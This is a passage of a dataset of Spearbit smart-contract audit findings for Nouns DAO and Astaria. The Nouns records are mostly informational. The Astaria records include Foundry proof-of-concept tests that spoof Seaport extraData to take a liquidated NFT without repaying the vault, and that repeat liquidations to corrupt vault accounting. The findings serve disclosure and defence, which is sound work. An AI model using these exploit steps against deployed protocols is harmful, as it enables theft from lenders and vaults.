readability.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Given that the state variables MAX_VOTING_PERIOD (NounsDAOV3Admin.sol#L115) and MAX_VOT- ING_DELAY (NounsDAOV3Admin.sol#L121) are in blocks, it is more readable if the name has a _BLOCKS suffix and is set to 2 weeks / 12 as done with MAX_OBJECTION_PERIOD_BLOCKS and MAX_UPDATABLE_PERIOD_BLOCKS. The functions, _setVotingDelay (L152) and _setVotingPeriod (L167), can be renamed in the same vain by adding -InBlocks suffix similar to _setObjectionPeriodDurationInBlocks and other functions. In addition to this, constants should be named with all capital letters with underscores separating words, follow- ing the Solidity style guide. For example, proposalMaxOperations in NounsDAOV3Proposals.sol#L138 can be renamed.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "External function is used instead of internal equivalent across NounsDAOV3Proposals logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Public view state(ds, proposalId) is used instead of the fully equivalent internal stateInter- nal(ds, proposalId) in the several occurrences of NounsDAOV3Proposals logic. For example, in the NounsDAOV3Proposals:updateProposalBySigs the state(ds, proposalId) is used instead of the stateInternal function: if (state(ds, proposalId) != NounsDAOStorageV3.ProposalState.Updatable) revert ,! CanOnlyEditUpdatableProposals(); 49", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Proposals created through proposeBySigs() can not be executed on TimelockV1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Currently, proposals created through the proposeBySigs() function can not be executed on Time- lockV1. This could potentially limit the flexibility of creating different types of proposals. It may be advantageous to have a parameter added to the proposeBySigs() function, allowing the proposer to decide whether the proposal should be executed on TimelockV1 or not. There's a design decision to be made regarding whether this value should be incorporated as part of the signers' signature, or simply left up to the proposer to determine if execution should happen on the TimelockV1 or not.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "escrowToFork() can be frontrun to prevent users from joining the fork during the escrow period", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "escrowToFork() could be frontrun by another user and make it revert by either: 1. Frontrunning with another escrowToFork() that reaches the fork threshold + executeFork(). 2. If the fork threshold was already reached, frontrunning with executeFork(). This forces the escrowing user to join the fork only during the forking period.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Fork spec says Nouns are escrowed during the fork active period", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Fork-Spec says: \"During the forking period additional forking Nouns are also sent to the escrow contract; the motivation is to have a clean separation between fork-related Nouns and Nouns owned by the DAO for other reasons.\" However, the implementation sends such Nouns to the original DAO treasury.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Known issues from previous versions/audit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Below are some of the known issues from previous versions as reported by the protocol team, documented in the audit report and is being recorded here verbatim for reporting purposes. Note: All issues reported earlier and not fixed in current version(s) of audit scope are assumed to be acknowledged without fixing. NounsToken delegateBySigs allows delegating to address zero Weve fixed this issue in the fork token contract, but cannot fix it in the original NounsToken because the contract isnt upgradeable. Voting gas refund can be abused Were aware of different ways of abusing this function: A token holder could delegate their Nouns to a contract and vote on multiple proposals in a loop, such that the tx gas overhead is amortized across all votes, while the refund function assumes each vote has the full overhead to bear; this could result in token holders profiting from gas refunds. A token holder could grief the DAO by voting with very long reason strings, in order to drain the refund balance faster. We find these issues low risk and unlikely given the small size of the community, and the low ETH balance the governor contract has to spend on refunds. Should we see such abusive activity, we might reconsider this feature. Nouns transfers will stop working when block number hits uint32 max value Were aware of this issue. It means the Nouns token will stop functioning a long long long time from now :) AuctionHouse has an open gas griefing vector Bidder Alice can bid from a smart contract that returns a large byte array when receiving ETH. Then if Bob outbids Alice, in his bid tx AuctionHouse refunds Alice, and the large return value causes a gas cost spike for Bob. See more details here. Were planning to fix this in the next AuctionHouse version, its launch date is unknown at this point. Using error strings instea of custom errors In all new code were using custom errors. In code thats forked from previous versions we optimized for the smallest diff possible, and so leaving error strings untouched.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "When a minority forks, the majority can follow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "This is a known issue as documented by the protocol team and is being recorded here verbatim for reporting purposes. For example, a malicious majority can vote For a proposal to drain the treasury, forcing others to fork; the majority can then join the fork with many of their tokens, benefiting from the passing proposal on the original DAO, while continuing to attack the minority in their new fork DAO, forcing them to quit the fork DAO. This is a well known flaw of the current fork design, something weve chosen to go live with for the sake of shipping something the DAO has asked for urgently.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "The original DAO can temporarily brick a fork DAOs token minting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "This is a known issue as documented by the protocol team and is being recorded here verbatim for reporting purposes. Weve decided in this version to deploy fork DAOs such that fork tokens reuse the same descriptor contract as the original DAOs token descriptor. Our motivations are minimizing lines of code and the gas cost of deploying a fork. This design poses a risk on fork tokens: the original DAO can update the descriptor to use a new art contract that always reverts, which would then lead to fork tokens mint function always reverting. The solution would be for the fork DAO to execute a proposal that deploys and sets a new descriptor to its token, which would use a valid art contract, allowing minting to resume. The fork DAO is guaranteed to be able to propose and execute such a proposal, because the function where Nouners claim their fork tokens does not use the descriptor, and so is not vulnerable to this attack.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Unused events, missing events and unindexed event parameters in contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Some contracts have missing or unused events, as well as event parameters that are unindexed. As an examples: 1. Unused events: INounsTokenFork.sol#L29: event NoundersDAOUpdated(address noundersDAO); 2. Missing events: NounsDAOV3Admin.sol#L509-514: Missing event like in _setForkEscrow 3. Unindexed parameters: NounsDAOEventsFork.sol: Many parameters can be indexed here", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Prefer using __Ownable_init instead of _transferOwnership to initialize upgradable contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The upgradable NounsAuctionHouseFork and the NounsTokenFork contracts inherit the OwnableUp- gradeable contract. However, inside the initialize function the ownership transfer is performed by calling the internal _transferOwnership function instead of calling the __Ownable_init. This deviates from the standard ap- proach of initializing upgradable contracts, and it can lead to issues if the OwnableUpgradeable contract changes its initialization mechanism.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Consider emitting the address of the timelock in the ProposalQueued event", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The queue function currently emits the ProposalQueued event to provide relevant information about the proposal, including the proposalId and the eta. However, it doesn't emit the timelock variable, which rep- resents the address of the timelock responsible for executing the proposal. This could lead to confusion among users regarding the intended timelock for proposal execution.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Use IERC20Upgradeable/IERC721Upgradeable for consistency with other contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Most contracts/libraries imported and used are the upgradeable variant e.g. OwnableUpgradeable. IERC20 and IERC721 are used which is inconsistent with the other contracts/libraries. Since the project is deployed with upgradeability featured, it is more preferable to use the Upgradeable variant of OpenZeppelin Contracts.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Specification says \"Pending\" state instead of \"Updatable\"", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The V3 spec says the following for \"Proposal editing\": \"The proposer account of a proposal in the PENDING state can call an updateProposal function, providing the new complete set of transactions to execute, as well as a complete new version of the proposal description text.\" This is incorrect because editing can only happen in the \"Updatable\" state which is just before the \"Pending\" state.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Typos, comments and descriptions need to be updated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "comments/descriptions. The contract Typos: source code contains several typographical errors and misaligned 1. NounsDAOLogicV1Fork.sol#L48: adjutedTotalSupply should be adjustedTotalSupply 2. NounsDAOLogicV1Fork.sol#L80: veteor shoud be vetoer 3. NounsDAOV3Votes.sol#L267: objetion should be objection 4. NounsDAOExecutorProxy.sol#L24: imlemenation should be implementation Comment Discrepancies: 1. NounsDAOV3Admin.sol#L130: Should say // 6,000 basis points or 60% and not 4,000 2. NounsDAOV3Votes.sol#L219: change string 'NounsDAO::castVoteInternal: voter already voted' to 'NounsDAO::castVoteDuringVotingPeriodInternal: voter already voted' 54 3. NounsDAOExecutorV2.sol#L209: change string 'NounsDAOExecutor::executeTransaction: Call must come from admin. to 'NounsDAOExecutor::sendETH: Call must come from admin. 4. NounsDAOExecutorV2.sol#L221: change string NounsDAOExecutor::executeTransaction: Call must come from admin. to NounsDAOExecutor::sendERC20: Call must come from admin. 5. NounsDAOV3DynamicQuorum.sol#L124: Should be adjusted total supply 6. NounsDAOV3DynamicQuorum.sol#L135: Should be adjusted total supply 7. NounsDAOLogicV3.sol#L902: Adjusted supply is used for minQuorumVotes() 8. NounsDAOLogicV3.sol#L909: Adjusted supply is used for maxQuorumVotes() 9. NounsDAOStorageV1Fork.sol#L33: proposalThresholdBPS is required to be exceeded, say when it is zero, one noun is needed to propose 10. NounsTokenFork.sol#L66: Typo, to be after which", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Contracts are not using the _disableInitializers function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Several Nouns-Dao contracts utilize the Initializable module provided by OpenZeppelin. To ensure that an implementation contract is not left uninitialized, it is recommended in OpenZeppelin's documentation to include the _disableInitializers function in the constructor. The _disableInitializers function automatically locks the contracts upon deployment. According to the OpenZeppelin documentation: Do not leave an implementation contract uninitialized. An uninitialized implementation contract can be taken over by an attacker, which may impact the proxy. To prevent the implementation contract from being used, you should invoke the _disableInitializers function in the constructor to automatically lock it when it is deployed:", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Missing or incomplete Natspec documentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "There are several instances throughout the codebase where NatSpec is either missing or incomplete. 1. Missing Natspec (Some functions in this case are missing Natspec comment):  NounsDAOV3Fork.sol#L203  NounsDAOV3Votes.sol#L295  NounsDAOV3Admin.sol  NounsDAOV3Proposals.sol  NounsDAOExecutor.sol  NounsDAOExecutorV2.sol 2. Incomplete Natspec (Some functions are missing @param tag):  NounsTokenFork.sol  NounsDAOV3Admin.sol  NounsDAOV3Proposals.sol  NounsDAOLogicV3.sol", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Function ordering does not follow the Solidity style guide", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The recommended order of functions in Solidity, as outlined in the Solidity style guide, is as follows: constructor(), receive(), fallback(), external, public, internal and private. However, this ordering isn't enforced in the across the Nouns-Dao codebase.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Use a more recent Solidity version", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The compiler version used 0.8.6 is quite old (current version is 0.8.20). This version was released almost two years ago and there have been five applicable bug fixes to this version since then. While it seems that those bugs don't apply to the Nouns-Dao codebase, it is advised to update the compiler to a newer version.", "labels": ["Spearbit", "Nouns", "Severity: Informational ERC721CheckpointableUpgradeable.sol#L46, NounsDAOExecutorV2.sol#L40, NounsDAOLog-"]}, {"title": "State modifications after external sToOwner prone to reentrancy attacks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "External NFT call happens before numTokensInEscrow update in returnTokensToOwner(). This looks safe (NFT is fixed to be noun contract and transferFrom() is used instead of the safe version, and also numTokensInEscrow = 0 in closeEscrow() acts as a control for numTokensInEscrow -= tokenIds.length logic), but in general this type of execution flow structuring could allow for direct stealing via reentrancy. I.e. in a presence of callback (e.g. arbitrary NFT instead of noun contract or safeTransferFrom instead of trans- ferFrom) and without numTokensInEscrow = 0 conflicting with numTokensInEscrow -= tokenIds.length, as an abstract example, an attacker would add the last needed noun for forking, then call withdrawFromForkEscrow() and then, being in returnTokensToOwner(), call executeFork() from the callback hook, successfully performing the fork, while already withdrawn the NFT that belongs to DAO.  NounsDAOForkEscrow.sol#L110-L125) function returnTokensToOwner(address owner, uint256[] calldata tokenIds) external onlyDAO { for (uint256 i = 0; i < tokenIds.length; i++) { if (currentOwnerOf(tokenIds[i]) != owner) revert NotOwner(); >> nounsToken.transferFrom(address(this), owner, tokenIds[i]); escrowedTokensByForkId[forkId][tokenIds[i]] = address(0); } numTokensInEscrow -= tokenIds.length; }  NounsDAOV3Fork.sol#L109-L130 57 function executeFork(NounsDAOStorageV3.StorageV3 storage ds) external returns (address forkTreasury, address forkToken) { if (isForkPeriodActive(ds)) revert ForkPeriodActive(); INounsDAOForkEscrow forkEscrow = ds.forkEscrow; >> uint256 tokensInEscrow = forkEscrow.numTokensInEscrow(); if (tokensInEscrow <= forkThreshold(ds)) revert ForkThresholdNotMet(); uint256 forkEndTimestamp = block.timestamp + ds.forkPeriod; (forkTreasury, forkToken) = ds.forkDAODeployer.deployForkDAO(forkEndTimestamp, forkEscrow); sendProRataTreasury(ds, forkTreasury, tokensInEscrow, adjustedTotalSupply(ds)); uint32 forkId = forkEscrow.closeEscrow(); ds.forkDAOTreasury = forkTreasury; ds.forkDAOToken = forkToken; ds.forkEndTimestamp = forkEndTimestamp; emit ExecuteFork(forkId, forkTreasury, forkToken, forkEndTimestamp, tokensInEscrow); } Direct stealing as a result of state manipulations is possible conditional on an ability to enter a callback. Given the absense of the latter at the moment, but critical impact of the former, considering this as best practice recommen- dation and setting the severity to be informational.", "labels": ["Spearbit", "Nouns", "Severity: Informational interactions make NounsDAOForkEscrow's returnToken-"]}, {"title": "No need to use an assembly block to get the chain ID", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Currently the getChainId() uses an assembly block to get the current chain ID when constructing the domain separator. This is not needed since there is a global variable for this already.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "Naming convention for interfaces is not always always followed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The NounsTokenForkLike interface does not follow the standard naming convention for Solidity interfaces, which begins with an I prefix. This inconsistency can make it harder for developers to understand the purpose and usage of the contract.", "labels": ["Spearbit", "Nouns", "Severity: Informational"]}, {"title": "The extra data (encoded stack) provided to advanced orders to Seaport are not validated properly by the CollateralToken upon callback", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The extra data (encoded stack) provided to advanced orders to Seaport are not validated properly by the CollateralToken upon callback when validateOrder(...) order is called by Seaport. When a stack/lien gets liquidated an auction is created on Seaport with the offerer and zone set as the Col- lateralToken and the order type is full restricted so that the aforementioned call back is performed at the end of fulfilment/matching orders on Seaport. An extra piece of information which needs to be provided by the fulfiller or matcher on Seaport is the extra data which is the encoded stack. The only validation that happens during the call back is the following to make sure that the 1st consideration's token matches with the decoded stack's lien's token: ERC20 paymentToken = ERC20(zoneParameters.consideration[0].token); if (address(paymentToken) != stack.lien.token) { revert InvalidPaymentToken(); } Besides that one does not check that this stack corresponds to the same collateralId with the same lien id. So a bidder on Seaport can take advantage of this and provide a spoofed extra data as follows: 1. The borrower collateralises its NFT token and takes a lien from a public vault 2. The lien expires and a liquidator calls liquidate(...) for the corresponding stack. 3. The bidder creates a private vault and deposits 1 wei worth of WETH into it. 4. The bidder collateralises a fake NFT token and takes a lien with 1 wei worth of WETH as a loan 5. The bidder provides the encoded fake stack from the step 4 as an extra data to settle the auction for the real liquidated lien from step 2 on Seaport. The net result from these steps are that  The original NFT token will be owned by the bidder.  The change in the sum of the ETH and WETH balances of the borrower, liquidator and the bidder would be the original borrowed amount from step 1. (might be off by a few wei due to division errors when calculating the liquidator fees).  The original public vault would not receive its loan amount from the borrower or the auction amount the Seaport liquidation auction. If the borrower, the liquidator and the bidder were the same, this entity would end up with its original NFT token plus the loaned amount from the original public vault. If the liquidator and the bidder were the same, the bidder would end up with the original NFT token and might have to pay around 1 wei due to division errors. The borrower gets to keep its loan. The public vault would not receive the loan or any portion of the amount settled in the liquidation auction. The following diff in the test contracts is needed for the PoC to work: 5 diff --git a/src/test/TestHelpers.t.sol b/src/test/TestHelpers.t.sol index fab5fbd..5c9bfc8 100644 --- a/src/test/TestHelpers.t.sol +++ b/src/test/TestHelpers.t.sol @@ -163,7 +163,6 @@ contract ConsiderationTester is BaseSeaportTest, AmountDeriver { vm.label(address(this), \"testContract\"); } } - contract TestHelpers is Deploy, ConsiderationTester { using CollateralLookup for address; using Strings2 for bytes; @@ -1608,7 +1607,7 @@ contract TestHelpers is Deploy, ConsiderationTester { orders, new CriteriaResolver[](0), fulfillments, address(this) incomingBidder.bidder - + ); } else { consideration.fulfillAdvancedOrder( @@ -1621,7 +1620,7 @@ contract TestHelpers is Deploy, ConsiderationTester { ), new CriteriaResolver[](0), bidderConduits[incomingBidder.bidder].conduitKey, address(this) incomingBidder.bidder - + ); } delete fulfillments; The PoC: forge t --mt testScenario9 --ffi -vvv // add the following test case to // file: src/test/LienTokenSettlementScenarioTest.t.sol // Scenario 8: commitToLien -> liquidate -> settle Seaport auction with mismtaching stack as an ,! extraData function testScenario9() public { TestNFT nft = new TestNFT(1); address tokenContract = address(nft); uint256 tokenId = uint256(0); vm.label(address(this), \"borrowerContract\"); { // create a PublicVault with a 14-day epoch address publicVault = _createPublicVault( strategistOne, strategistTwo, 14 days, 1e17 ); vm.label(publicVault, \"Public Vault\"); // lend 10 ether to the PublicVault as address(1) _lendToVault( Lender({addr: address(1), amountToLend: 10 ether}), payable(publicVault) 6 ); WETH9.balanceOf(publicVault)); emit log_named_uint(\"Public vault WETH balance before commiting to a lien\", ,! emit log_named_uint(\"borrower ETH balance before commiting to a lien\", address(this).balance); emit log_named_uint(\"borrower WETH balance before commiting to a lien\", ,! WETH9.balanceOf(address(this))); // borrow 10 eth against the dummy NFT with tokenId 0 (, ILienToken.Stack memory stack) = _commitToLien({ vault: payable(publicVault), strategist: strategistOne, strategistPK: strategistOnePK, tokenContract: tokenContract, tokenId: tokenId, lienDetails: ILienToken.Details({ maxAmount: 50 ether, rate: (uint256(1e16) * 150) / (365 days), duration: 10 days, maxPotentialDebt: 0 ether, liquidationInitialAsk: 100 ether }), amount: 10 ether }); assertEq( nft.ownerOf(tokenId), address(COLLATERAL_TOKEN), \"The bidder did not receive the collateral token after the auction end.\" ); WETH9.balanceOf(publicVault)); emit log_named_uint(\"Public vault WETH balance after commiting to a lien\", ,! emit log_named_address(\"NFT token owner\", nft.ownerOf(tokenId)); emit log_named_uint(\"borrower ETH balance after commiting to a lien\", address(this).balance); emit log_named_uint(\"borrower WETH balance after commiting to a lien\", ,! WETH9.balanceOf(address(this))); uint256 collateralId = tokenContract.computeId(tokenId); // verify the strategist has no shares minted assertEq( PublicVault(payable(publicVault)).balanceOf(strategistOne), 0, \"Strategist has incorrect share balance\" ); // verify that the borrower has the CollateralTokens assertEq( COLLATERAL_TOKEN.ownerOf(collateralId), address(this), \"CollateralToken not minted to borrower\" ); // fast forward to the end of the lien one vm.warp(block.timestamp + 10 days); address liquidatorOne = vm.addr(0x1195da7051); vm.label(liquidatorOne, \"liquidator 1\"); // liquidate the lien vm.startPrank(liquidatorOne); 7 emit log_named_uint(\"liquidator WETH balance before liquidation\", WETH9.balanceOf(liquidatorOne)); OrderParameters memory listedOrder = _liquidate(stack); vm.stopPrank(); assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralId), liquidatorOne, \"liquidator is not stored in s.collateralLiquidator[collateralId]\" ); // --- start of the attack --- vm.label(bidder, \"bidder\"); vm.startPrank(bidder); TestNFT fakeNFT = new TestNFT(1); address fakeTokenContract = address(fakeNFT); uint256 fakeTokenId = uint256(0); vm.stopPrank(); address privateVault = _createPrivateVault( bidder, bidder ); vm.label(privateVault, \"Fake Private Vault\"); _lendToPrivateVault( PrivateLender({ addr: bidder, amountToLend: 1 wei, token: address(WETH9) }), payable(privateVault) ); vm.startPrank(bidder); // it is important that the fakeStack.lien.token is the same as the original stack's token // below deals 1 wei to the bidder which is also the fakeStack borrower (, ILienToken.Stack memory fakeStack) = _commitToLien({ vault: payable(privateVault), strategist: bidder, strategistPK: bidderPK, tokenContract: fakeTokenContract, tokenId: fakeTokenId, lienDetails: ILienToken.Details({ maxAmount: 1 wei, rate: 1, // needs to be non-zero duration: 1 hours, // s.minLoanDuration maxPotentialDebt: 0 ether, liquidationInitialAsk: 1 wei }), amount: 1 wei }); emit log_named_uint(\"CollateralToken WETH balance before auction end\", ,! WETH9.balanceOf(address(COLLATERAL_TOKEN))); // _bid deals 300 ether to the bidder _bid( Bidder({bidder: bidder, bidderPK: bidderPK}), listedOrder, // order paramters created for the original stack during the liquidation 100 ether, // stack.lien.details.liquidationInitialAsk 8 fakeStack ); emit log_named_uint(\"Public vault WETH balance after auction end\", WETH9.balanceOf(publicVault)); emit log_named_uint(\"borrower WETH balance after auction end\", WETH9.balanceOf(address(this))); emit log_named_uint(\"liquidator WETH balance after auction end\", WETH9.balanceOf(liquidatorOne)); emit log_named_uint(\"bidder WETH balance after auction end\", WETH9.balanceOf(bidder)); emit log_named_uint(\"bidder ETH balance before commiting to a lien\", address(bidder).balance); emit log_named_uint(\"CollateralToken WETH balance after auction end\", ,! emit log_named_address(\"bidder\", bidder); emit log_named_address(\"owner of the original collateral after auction end\", ,! WETH9.balanceOf(address(COLLATERAL_TOKEN))); nft.ownerOf(tokenId)); // _removeLien is not called for collateralId assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralId), liquidatorOne, \"_removeLien is called for collateralId\" ); // WETH balance of the public vault is still 0 even after the auction assertEq( WETH9.balanceOf(publicVault), 0 ); } assertEq( nft.ownerOf(tokenId), bidder, \"The bidder did not receive the collateral token after the auction end.\" ); }", "labels": ["Spearbit", "Astaria", "Severity: Critical Risk"]}, {"title": "AstariaRouter.liquidate(...) can be called multiple times for an expired lien/stack", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The current implementation of the protocol does not have any safeguard around calling Astari- aRouter.liquidate(...) only once for an expired stack/lien. Thus, when a lien expires, multiple adversaries can override many different parameters by calling this endpoint at will in the same block or different blocks till one of the created auctions settles (which might not as one can keep stacking these auctions with some delays to have a never-ending liquidation flow). Here is the list of storage parameters that can be manipulated:  s.collateralLiquidator[stack.lien.collateralId].amountOwed in LienToken: it is possible to keep in- creasing this value if we stack calls to the liquidate(...) with delays.  s.collateralLiquidator[stack.lien.collateralId].liquidator in LienToken: This can be overwritten and would hold the last liquidator's address and so only this liquidator can claim the NFT if the auction its corresponding auction does not settle and also it would receive the liquidation fees.  s.idToUnderlying[params.collateralId].auctionHash in CollateralToken: would hold the last created auction's order hash for the same expired lien backed by the same collateral.  slope in PublicVault: If the lien is taken from a public vault, each call to liquidate(...) would reduce this value. So we can make this slope really small.  s.epochData[epoch].liensOpenForEpoch in PublicVault: If the lien is taken from a public vault, each call to liquidate(...) would reduce this value. So we can make this slope really small or even 0 depends on the rate of this lien and the slope of the vault due to arithmetic underflows.  yIntercept in PublicVault: Mixing the manipulation of the vault's slope and stacking the calls to liqui- date(...) with delays we can also manipulate yIntercept. // add the following test case to: // file: src/test/LienTokenSettlementScenarioTest.t.sol function testScenario8() public { TestNFT nft = new TestNFT(2); address tokenContract = address(nft); uint256 tokenIdOne = uint256(0); uint256 tokenIdTwo = uint256(1); uint256 initialBalance = WETH9.balanceOf(address(this)); // create a PublicVault with a 14-day epoch address publicVault = _createPublicVault( strategistOne, strategistTwo, 14 days, 1e17 ); // lend 20 ether to the PublicVault as address(1) _lendToVault( Lender({addr: address(1), amountToLend: 20 ether}), payable(publicVault) ); uint256 vaultShares = PublicVault(payable(publicVault)).totalSupply(); // borrow 10 eth against the dummy NFT with tokenId 0 (, ILienToken.Stack memory stackOne) = _commitToLien({ vault: payable(publicVault), strategist: strategistOne, strategistPK: strategistOnePK, tokenContract: tokenContract, tokenId: tokenIdOne, lienDetails: ILienToken.Details({ 10 maxAmount: 50 ether, rate: (uint256(1e16) * 150) / (365 days), duration: 10 days, maxPotentialDebt: 0 ether, liquidationInitialAsk: 100 ether }), amount: 10 ether }); // borrow 10 eth against the dummy NFT with tokenId 1 (, ILienToken.Stack memory stackTwo) = _commitToLien({ vault: payable(publicVault), strategist: strategistOne, strategistPK: strategistOnePK, tokenContract: tokenContract, tokenId: tokenIdTwo, lienDetails: ILienToken.Details({ maxAmount: 50 ether, rate: (uint256(1e16) * 150) / (365 days), duration: 10 days, maxPotentialDebt: 0 ether, liquidationInitialAsk: 100 ether }), amount: 10 ether }); uint256 collateralIdOne = tokenContract.computeId(tokenIdOne); uint256 collateralIdTwo = tokenContract.computeId(tokenIdTwo); // verify the strategist has no shares minted assertEq( PublicVault(payable(publicVault)).balanceOf(strategistOne), 0, \"Strategist has incorrect share balance\" ); // verify that the borrower has the CollateralTokens assertEq( COLLATERAL_TOKEN.ownerOf(collateralIdOne), address(this), \"CollateralToken not minted to borrower\" ); assertEq( COLLATERAL_TOKEN.ownerOf(collateralIdTwo), address(this), \"CollateralToken not minted to borrower\" ); // fast forward to the end of the lien one vm.warp(block.timestamp + 10 days); address liquidatorOne = vm.addr(0x1195da7051); address liquidatorTwo = vm.addr(0x1195da7052); vm.label(liquidatorOne, \"liquidator 1\"); vm.label(liquidatorTwo, \"liquidator 2\"); // liquidate the first lien vm.startPrank(liquidatorOne); OrderParameters memory listedOrder = _liquidate(stackOne); vm.stopPrank(); 11 assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralIdOne), liquidatorOne, \"liquidator is not stored in s.collateralLiquidator[collateralId]\" ); // // liquidate the first lien with a different liquidator vm.startPrank(liquidatorTwo); listedOrder = _liquidate(stackOne); vm.stopPrank(); assertEq( LIEN_TOKEN.getAuctionLiquidator(collateralIdOne), liquidatorTwo, \"liquidator is not stored in s.collateralLiquidator[collateralId]\" ); // validate the slope is updated twice for the same expired lien // and so the accounting for the public vault is manipulated assertEq( PublicVault(payable(publicVault)).getSlope(), 0, \"PublicVault slope divergent\" ); // publicVault.storageSlot.epochData[epoch].liensOpenForEpoch is also dfecremented twice // CollateralToken.storageSlot.idToUnderlying[params.collateralId].auctionHash can also be ,! manipulated }", "labels": ["Spearbit", "Astaria", "Severity: Critical Risk"]}, {"title": "maxStrategistFee is incorrectly set in AstariaRouter's constructor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In AstariaRouter's constructor we set the maxStrategistFee as s.maxStrategistFee = uint256(50e17); // 5e18 But in the filing route we check that this value should not be greater than 1e18. 12 maxStrategistFee is supposed to set an upper bound for public vaults's strategist vault fee. When a payment is made for a lien, one calculates the shares to be minted for the strategist based on this value and the interest amount paid: function _handleStrategistInterestReward( VaultData storage s, uint256 interestPaid ) internal virtual { if (VAULT_FEE() != uint256(0) && interestPaid > 0) { uint256 fee = interestPaid.mulWadDown(VAULT_FEE()); uint256 feeInShares = convertToShares(fee); _mint(owner(), feeInShares); } } Note that we are using mulWadDown(...) here: F = j I (cid:1) f 1018k parameter description F f I fee VAULT_FEE() interestPaid so we would want f (cid:20) 1018. Currently, a vault could charge 5 times the interest paid.", "labels": ["Spearbit", "Astaria", "Severity: High Risk"]}, {"title": "When a vault is shutdown a user can still commit to liens using the vault", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "When a vault is shutdown, one should not be able to take more liens using the funds from this vault. In the commit to lien flow, AstariaRouter fetches the state of the vault 13 ( , address delegate, address owner, , , // s.isShutdown uint256 nonce, bytes32 domainSeparator ) = IVaultImplementation(c.lienRequest.strategy.vault).getState(); But does not use the s.isShutdown flag to stop the flow if it is set to true. When a vault is shutdown we should have: vault endpoint reverts should revert deposit mint redeem withdraw redeemFutureEpoch payment flows liquidation flows commitToLien YES YES NO NO NO NO NO YES // add this test case to // file: src/test/LienTokenSettlementScenarioTest.t.sol // Scenario 12: create vault > shutdown > commitToLien function testScenario12() public { { console2.log(\"--- test private vault shutdown ---\"); uint256 ownerPK = uint256(0xa77ac3); address owner = vm.addr(ownerPK); vm.label(owner, \"owner\"); uint256 lienId; TestNFT nft = new TestNFT(1); address tokenContract = address(nft); uint256 tokenId = uint256(0); address privateVault = _createPrivateVault(owner, owner); vm.label(privateVault, \"privateVault\"); console2.log(\"[+] private vault is created: %s\", privateVault); // lend 1 wei to the privateVault _lendToPrivateVault( PrivateLender({addr: owner, amountToLend: 1 wei, token: address(WETH9)}), payable(privateVault) ); console2.log(\"[+] lent 1 wei to the private vault.\"); console2.log(\"[+] shudown private vault.\"); 14 vm.startPrank(owner); Vault(payable(privateVault)).shutdown(); vm.stopPrank(); assertEq( Vault(payable(privateVault)).getShutdown(), true, \"Private Vault should be shutdown.\" ); // borrow 1 wei 